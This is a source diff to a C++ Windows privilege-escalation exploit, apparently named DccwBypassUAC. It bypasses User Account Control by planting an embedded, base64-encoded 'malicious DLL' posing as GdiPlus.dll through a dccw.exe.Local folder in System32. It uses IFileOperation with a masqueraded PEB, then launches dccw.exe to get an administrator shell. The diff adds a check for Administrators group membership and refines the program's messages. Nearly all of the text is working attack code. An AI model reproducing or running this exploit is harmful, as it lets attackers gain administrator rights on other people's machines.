@@ -16,6 +16,8 @@
 #pragma comment(lib, "crypt32.lib") 
 #pragma comment(lib, "Cabinet.lib")
 
+#define MAX_NAME 256
+
 const int MINIMUM_BUILD_VERSION = 7600;
 const DWORD ALWAYS_NOTIFY_UAC_LEVEL = 2;
 const DWORD DEFAULT_UAC_LEVEL = 5;
@@ -390,13 +392,91 @@ BOOL createDirectories(LPCTSTR targetedDirectories) {
 	return success;
 }
 
+BOOL checkAdministratorGroup() {
+	DWORD i, dwSize = 0, dwResult = 0;
+	HANDLE hToken;
+	PTOKEN_GROUPS pGroupInfo;
+	SID_NAME_USE SidType;
+	WCHAR lpName[MAX_NAME];
+	WCHAR lpDomain[MAX_NAME];
+	BYTE sidBuffer[100];
+	PSID pSID = (PSID)&sidBuffer;
+	BOOL belongsToAdministratorsGroup = FALSE;
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+	{
+		wprintf(L" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
+		return TRUE;
+	} else {
+
+		if (!GetTokenInformation(hToken, TokenGroups, NULL, dwSize, &dwSize)) {
+			dwResult = GetLastError();
+			if (dwResult != ERROR_INSUFFICIENT_BUFFER)
+			{
+				wprintf(L" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
+				return TRUE;
+			}
+		}
+
+		pGroupInfo = (PTOKEN_GROUPS)GlobalAlloc(GPTR, dwSize);
+
+		if (!GetTokenInformation(hToken, TokenGroups, pGroupInfo, dwSize, &dwSize)) {
+			wprintf(L" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
+			return TRUE;
+		} else {
+			SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
+			if (!AllocateAndInitializeSid(&SIDAuth, 2,
+				SECURITY_BUILTIN_DOMAIN_RID,
+				DOMAIN_ALIAS_RID_ADMINS,
+				0, 0, 0, 0, 0, 0,
+				&pSID)) {
+				wprintf(L" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
+				return TRUE;
+			} else {
+
+				for (i = 0; i < pGroupInfo->GroupCount; i++) {
+					if (EqualSid(pSID, pGroupInfo->Groups[i].Sid)) {
+						dwSize = MAX_NAME;
+						if (!LookupAccountSid(NULL,
+							pGroupInfo->Groups[i].Sid,
+							lpName,
+							&dwSize,
+							lpDomain,
+							&dwSize,
+							&SidType)) {
+							dwResult = GetLastError();
+							if (dwResult == ERROR_NONE_MAPPED)
+								wcscpy_s(lpName, sizeof(lpName), L"NONE_MAPPED");
+							else {
+								wprintf(L" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
+								return TRUE;
+							}
+						} else {
+							belongsToAdministratorsGroup = TRUE;
+							break;
+						}
+					}
+				}
+			}
+		}
+	}
+
+	if (pSID) {
+		FreeSid(pSID);
+	}
+	if (pGroupInfo) {
+		GlobalFree(pGroupInfo);
+	}
+	return belongsToAdministratorsGroup;
+}
+
 std::wstring getBuildNumber() {
 	HKEY root = HKEY_LOCAL_MACHINE;
 	std::wstring key = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
 	std::wstring name = L"CurrentBuild";
 	HKEY hKey;
 	if (RegOpenKeyEx(root, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
-		wprintf(L"Error! The Windows build number cannot be determined! Trying the default one...\n");
+		wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
 		return std::to_wstring(MINIMUM_BUILD_VERSION);
 	}
 
@@ -405,20 +485,20 @@ std::wstring getBuildNumber() {
 	if (RegQueryValueEx(hKey, name.c_str(), NULL, &type, NULL, &cbData) != ERROR_SUCCESS)
 	{
 		RegCloseKey(hKey);
-		wprintf(L"Error! The Windows build number cannot be determined! Trying the default one...\n");
+		wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
 		return std::to_wstring(MINIMUM_BUILD_VERSION);
 	}
 
 	if (type != REG_SZ) {
 		RegCloseKey(hKey);
-		wprintf(L"Error! The Windows build number cannot be determined! Trying the default one...\n");
+		wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
 		return std::to_wstring(MINIMUM_BUILD_VERSION);
 	}
 
 	std::wstring value(cbData / sizeof(wchar_t), L'\0');
 	if (RegQueryValueEx(hKey, name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value[0]), &cbData) != ERROR_SUCCESS) {
 		RegCloseKey(hKey);
-		wprintf(L"Error! The Windows build number cannot be determined! Trying the default one...\n");
+		wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
 		return std::to_wstring(MINIMUM_BUILD_VERSION);
 	}
 
@@ -437,7 +517,7 @@ DWORD getUACLevel() {
 	std::wstring name = L"ConsentPromptBehaviorAdmin";
 	HKEY hKey;
 	if (RegOpenKeyEx(root, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
-		wprintf(L"Error! The UAC level cannot be determined! Trying the default one...\n");
+		wprintf(L" [-] Error! The UAC level cannot be determined! Trying the default one...\n");
 		return DEFAULT_UAC_LEVEL;
 	}
 
@@ -447,7 +527,7 @@ DWORD getUACLevel() {
 	DWORD value(0);
 	if (RegQueryValueEx(hKey, name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value), &cbData) != ERROR_SUCCESS) {
 		RegCloseKey(hKey);
-		wprintf(L"Error! The UAC level cannot be determined! Trying the default one...\n");
+		wprintf(L" [-] Error! The UAC level cannot be determined! Trying the default one...\n");
 		return DEFAULT_UAC_LEVEL;
 	}
 
@@ -614,119 +694,127 @@ BOOL removeFilesAndDirectories(LPCWSTR targetedDirectories) {
 }
 
 int wmain(int argc, wchar_t* argv[]) {
+	if (argc == 1) {
+		std::wstring buildVersion = getBuildNumber();
+		if (std::stoi(buildVersion) >= MINIMUM_BUILD_VERSION) {
+			HANDLE hToken;
+			HANDLE hProcess;
+			DWORD dwLengthNeeded;
+			DWORD dwError = ERROR_SUCCESS;
+			PTOKEN_MANDATORY_LABEL pTIL = NULL;
+			LPWSTR pStringSid;
+			DWORD dwIntegrityLevel;
 
-	std::wstring buildVersion = getBuildNumber();
-	if (std::stoi(buildVersion) >= MINIMUM_BUILD_VERSION) {
-		HANDLE hToken;
-		HANDLE hProcess;
+			hProcess = GetCurrentProcess();
+			if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
+				// Get the Integrity level.
+				if (!GetTokenInformation(hToken, TokenIntegrityLevel,
+					NULL, 0, &dwLengthNeeded)) {
+					dwError = GetLastError();
+					if (dwError == ERROR_INSUFFICIENT_BUFFER) {
+						pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,
+							dwLengthNeeded);
+						if (pTIL != NULL) {
+							if (GetTokenInformation(hToken, TokenIntegrityLevel,
+								pTIL, dwLengthNeeded, &dwLengthNeeded)) {
+								dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
+									(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
 
-		DWORD dwLengthNeeded;
-		DWORD dwError = ERROR_SUCCESS;
+								if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
+									if (checkAdministratorGroup()) {
+										if (getUACLevel() != ALWAYS_NOTIFY_UAC_LEVEL) {
+											WIN32_FIND_DATA FindFileData;
+											HANDLE hFind;
+											LPCWSTR folderName;
+											LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*";
+											LPCWSTR destPath;
+											GdiPlus32 gdiplus32;
+											LPWSTR version = CharLower(argv[1]);
 
-		PTOKEN_MANDATORY_LABEL pTIL = NULL;
-		LPWSTR pStringSid;
-		DWORD dwIntegrityLevel;
+											destPath = L"C:\\Windows\\System32";
+											folderName = L"C:\\Windows\\System32\\dccw.exe.Local";
 
-		hProcess = GetCurrentProcess();
-		if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
-			// Get the Integrity level.
-			if (!GetTokenInformation(hToken, TokenIntegrityLevel,
-				NULL, 0, &dwLengthNeeded)) {
-				dwError = GetLastError();
-				if (dwError == ERROR_INSUFFICIENT_BUFFER) {
-					pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,
-						dwLengthNeeded);
-					if (pTIL != NULL) {
-						if (GetTokenInformation(hToken, TokenIntegrityLevel,
-							pTIL, dwLengthNeeded, &dwLengthNeeded)) {
-							dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
-								(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
+											wprintf(L" [+] Creating temporary folders...\n");
+											if (!createDirectories(targetedDirectories)) {
+												wprintf(L" [-] Error! Cannot create the necessary directories!\n");
+												wprintf(L" [+] Stopping the execution...\n");
+												return 1;
+											}
 
-							if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
-								if (getUACLevel() != ALWAYS_NOTIFY_UAC_LEVEL) {
-									WIN32_FIND_DATA FindFileData;
-									HANDLE hFind;
-									LPCWSTR folderName;
-									LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*";
-									LPCWSTR destPath;
-									GdiPlus32 gdiplus32;
-									LPWSTR version = CharLower(argv[1]);
+											wprintf(L" [+] Extracting the malicious DLL..\n");
+											CHAR *gdiplus = gdiplus32.getEncodedDLL();
+											std::vector <std::wstring> dirNames;
+											dirNames = getDirectories(targetedDirectories);
+											for (int i = 0; i < dirNames.size(); i++) {
+												std::wstring filename(L"\\GdiPlus.dll");
+												std::wstring path = dirNames.at(i) + filename;
+												LPCWSTR finalPath = path.c_str();
+												if (!base64DecodeAndDecompressDLL(gdiplus, finalPath)) {
+													wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
+													removeFilesAndDirectories(targetedDirectories);
+													wprintf(L" [+] Stopping the execution...\n");
+													return 1;
+												}
+											}
 
-									destPath = L"C:\\Windows\\System32";
-									folderName = L"C:\\Windows\\System32\\dccw.exe.Local";
+											wprintf(L" [+] Masquerading the PEB...\n");
+											if (!IFileOperationCopy(destPath, buildVersion)) {
+												removeFilesAndDirectories(targetedDirectories);
+												wprintf(L" [+] Stopping the execution...\n");
+												return 1;
+											}
 
-									wprintf(L" [+] Creating temporary folders...\n");
-									if (!createDirectories(targetedDirectories)) {
-										wprintf(L" [-] Error! Cannot create the necessary directories!\n");
-										wprintf(L" [+] Stopping the execution...\n");
-										return 1;
-									}
+											hFind = FindFirstFile(folderName, &FindFileData);
+											if (hFind == INVALID_HANDLE_VALUE) {
+												wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
+												wprintf(L" [+] Stopping the execution...\n");
+												removeFilesAndDirectories(targetedDirectories);
+												return 1;
+											} else {
+												FindClose(hFind);
 
-									wprintf(L" [+] Extracting the malicious DLL..\n");
-									CHAR *gdiplus = gdiplus32.getEncodedDLL();
-									std::vector <std::wstring> dirNames;
-									dirNames = getDirectories(targetedDirectories);
-									for (int i = 0; i < dirNames.size(); i++) {
-										std::wstring filename(L"\\GdiPlus.dll");
-										std::wstring path = dirNames.at(i) + filename;
-										LPCWSTR finalPath = path.c_str();
-										if (!base64DecodeAndDecompressDLL(gdiplus, finalPath)) {
-											wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
-											removeFilesAndDirectories(targetedDirectories);
-											wprintf(L" [+] Stopping the execution...\n");
-											return 1;
-										}
-									}
+												wprintf(L" [+] Starting dccw.exe (cross the fingers and wait to get an Administrator shell)...\n");
 
-									wprintf(L" [+] Masquerading the PEB...\n");
-									if (!IFileOperationCopy(destPath, buildVersion)) {
-										removeFilesAndDirectories(targetedDirectories);
-										wprintf(L" [+] Stopping the execution...\n");
-										return 1;
-									}
-
-									hFind = FindFirstFile(folderName, &FindFileData);
-									if (hFind == INVALID_HANDLE_VALUE) {
-										wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
-										wprintf(L" [+] Stopping the execution...\n");
-										removeFilesAndDirectories(targetedDirectories);
-										return 1;
-									} else {
-										FindClose(hFind);
-
-										wprintf(L" [+] Starting dccw.exe (cross the fingers and wait to get an Administrator shell)...\n");
-
-										if ((int) ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\dccw.exe", NULL, NULL, SW_SHOW) > 32) {
-											IFileOperationDelete(destPath, buildVersion);
-											removeFilesAndDirectories(targetedDirectories);
-											wprintf(L" [+] Great! The exploit has been successful!\n");
+												if ((int)ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\dccw.exe", NULL, NULL, SW_SHOW) > 32) {
+													IFileOperationDelete(destPath, buildVersion);
+													removeFilesAndDirectories(targetedDirectories);
+													wprintf(L" [+] Great! The exploit has been successful!\n");
+												} else {
+													IFileOperationDelete(destPath, buildVersion);
+													removeFilesAndDirectories(targetedDirectories);
+													wprintf(L" [-] Error! The exploit has not worked as expected!\n");
+													wprintf(L" [+] Stopping the execution...\n");
+												}
+											}
 										} else {
-											IFileOperationDelete(destPath, buildVersion);
-											removeFilesAndDirectories(targetedDirectories);
-											wprintf(L" [-] Error! The exploit has not worked as expected!\n");
+											//The user does not belong to Administrators group
+											wprintf(L" [!] Damn! The user does not belong to Administrators group!\n");
 											wprintf(L" [+] Stopping the execution...\n");
 										}
+									} else {
+										//UAC level set to "Always notify"
+										wprintf(L" [!] Damn! The UAC level is set to \"Always notify\"!\n");
+										wprintf(L" [+] Stopping the execution...\n");
 									}
 								} else {
-									//UAC level set to "Always notify"
-									wprintf(L"Damn! The UAC level is set to \"Always notify\"!\n");
+									// High or System Integrity
+									wprintf(L" [!] You already have Administrator rights! There is no need to execute the script ;)\n");
 									wprintf(L" [+] Stopping the execution...\n");
 								}
-							} else {
-								// High or System Integrity
-								wprintf(L"You already have Administrator rights! There is no need to execute the script ;)\n");
-								wprintf(L" [+] Stopping the execution...\n");
 							}
+							LocalFree(pTIL);
 						}
-						LocalFree(pTIL);
 					}
 				}
+				CloseHandle(hToken);
 			}
-			CloseHandle(hToken);
+		} else {
+			wprintf(L" [-] Error! Windows version not suported!\n");
+			wprintf(L" [+] Stopping the execution...\n");
 		}
 	} else {
-		wprintf(L" [-] Error! Windows version not suported!\n");
-		wprintf(L" [+] Stopping the execution...\n");
+		wprintf(L" [-] Error! This exploit does not support arguments. Execute it as follows:\n");
+		wprintf(L" > DccwBypassUAC.exe\n");
 	}
 	return 0;
 }
